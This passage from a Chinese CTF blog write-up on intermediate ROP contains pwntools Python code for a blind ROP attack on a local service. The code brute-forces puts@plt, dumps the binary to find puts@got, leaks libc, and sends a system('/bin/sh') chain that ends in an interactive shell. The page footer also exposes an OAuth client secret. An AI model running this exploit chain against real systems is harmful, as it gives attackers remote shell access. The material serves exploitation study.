+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span><span class="params">(length, rdi_ret, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'A'</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">'\x7fELF'</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'find puts@plt addr: 0x%x'</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure>
+
+<p>5.寻找put@got</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(length, rdi_ret, puts_plt, leak_addr, stop_gadget)</span>:</span></span><br><span class="line">    sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">"\nWelCome"</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">""</span>:</span><br><span class="line">            data = <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(addr)</span><br><span class="line">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += data</span><br><span class="line">    addr += len(data)  <span class="comment">#这里的len(data)若为\x00则为1，没毛病。若不为\x00为其他字节，因为一个地址对应一个储存单元对应一字节，而且len(data)为字节数，所以输入多少个字节就往后移动多少字节就ok</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'code'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure>
+
+<p>可以根据输出的数据转化为汇编来看plt表中的got地址</p>
+<p>之后在通过put@plt泄露出puts@got中的内容（即libc中的地址）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line"><span class="comment">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">'\nWelCome'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/01/14/%E4%B8%AD%E7%BA%A7ROP/" data-id="ck5dzf04500004wlu9e8dfxod"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6%E5%8C%BA/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">攻防世界进阶区</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '665e1db541e975225bc6',
+      clientSecret: '525f3534fe6005375cf8c02330ed09a2b7aab7d5',
+      repo: 'talk',
+      owner: 'summerN',
+      admin: ['summerN'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 summerN&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
